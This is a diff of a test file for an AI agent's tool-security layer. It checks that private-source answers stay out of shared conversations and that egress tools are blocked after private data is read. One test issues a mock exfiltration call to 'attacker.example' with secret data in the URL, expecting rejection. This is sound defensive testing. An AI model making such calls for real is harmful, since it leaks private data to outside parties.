@@ -51,17 +51,33 @@ it('returns ordinary conversation answers in the thread rather than a private Ru
   const { runReport } = await import('../../server/utils/agent-tool-security')
   expect(await runReport(f.env, { ...run, status: 'completed', resultText: 'Привет! Вот ответ.' })).toMatchObject({ text: 'Привет! Вот ответ.', restricted: false })
 })
-it('answers in the conversation after an authorized resource tool was used', async () => {
+it('keeps answers drawn from private sources out of shared conversations', async () => {
   const { run } = await f.run()
   f.db.prepare("INSERT INTO agent_run_tools(run_id,call_id,name,arguments_json,policy_json,status,result_json,created_at) VALUES(?,?,'get_task','{}','{}','completed','{}',?)").run(run.id, 'private-read', new Date().toISOString())
   const { runReport } = await import('../../server/utils/agent-tool-security')
   const report = await runReport(f.env, { ...run, status: 'completed', resultText: 'Private task content' })
-  expect(report).toMatchObject({ restricted: false, text: 'Private task content' })
+  expect(report.restricted).toBe(true)
+  expect(report.text).not.toContain('Private task content')
 })
-it('answers private repository questions in the conversation where they were asked', async () => {
+it('answers private repository questions in the direct conversation of the asking Member', async () => {
   const { run } = await f.run()
   f.db.prepare("INSERT INTO agent_run_tools(run_id,call_id,name,arguments_json,policy_json,status,result_json,created_at) VALUES(?,?,'inspect_private_project_repository','{}','{}','completed','{}',?)").run(run.id, 'private-repo', new Date().toISOString())
+  f.db.prepare("INSERT INTO channels(id,name,type,visibility) VALUES('agent-dm','','dm','private')").run()
+  for (const user of [run.initiatedBy, run.agentId]) f.db.prepare('INSERT INTO channel_members(channel_id,user_id,joined_at) VALUES(?,?,?)').run('agent-dm', user, new Date().toISOString())
   const { runReport } = await import('../../server/utils/agent-tool-security')
-  const result = { ...run, status: 'completed', resultText: 'Private repository answer' }
-  expect(await runReport(f.env, result)).toMatchObject({ restricted: false, text: 'Private repository answer' })
+  const result = { ...run, status: 'completed' as const, resultText: 'Private repository answer' }
+  expect(await runReport(f.env, { ...result, channelId: 'agent-dm' })).toMatchObject({ restricted: false, text: 'Private repository answer' })
+  expect((await runReport(f.env, result)).restricted).toBe(true)
+  f.db.prepare('INSERT INTO channel_members(channel_id,user_id,joined_at) VALUES(?,?,?)').run('agent-dm', ids.member, new Date().toISOString())
+  expect((await runReport(f.env, { ...result, channelId: 'agent-dm' })).restricted).toBe(true)
+})
+it('blocks open egress once a role-mode Session has read private data, and allows research before that', async () => {
+  const { run, authorization } = await f.run()
+  expect(toolSecurityReason('read_url', true, 'role', false)).toBeNull()
+  expect(toolSecurityReason('read_url', true, 'role', true)).toBe('private_context_blocks_egress')
+  expect(toolSecurityReason('mcp_search', true, 'role', true)).toBe('private_context_blocks_egress')
+  expect(toolSecurityReason('create_task', true, 'role', true)).toBeNull()
+  f.db.prepare("INSERT INTO agent_run_tools(run_id,call_id,name,arguments_json,policy_json,status,result_json,created_at) VALUES(?,?,'read_records','{}','{}','completed','{}',?)").run(run.id, 'private-data', new Date().toISOString())
+  await expect(executeRunTool(f.env, run.id, authorization, { callId: 'exfil', name: 'read_url', arguments: { url: 'https://attacker.example/?d=secret' } }, () => {})).rejects.toMatchObject({ statusCode: 403 })
+  expect(f.db.prepare("SELECT reason FROM agent_tool_decisions WHERE run_id=? AND call_id='exfil'").get(run.id)).toMatchObject({ reason: 'private_context_blocks_egress' })
 })
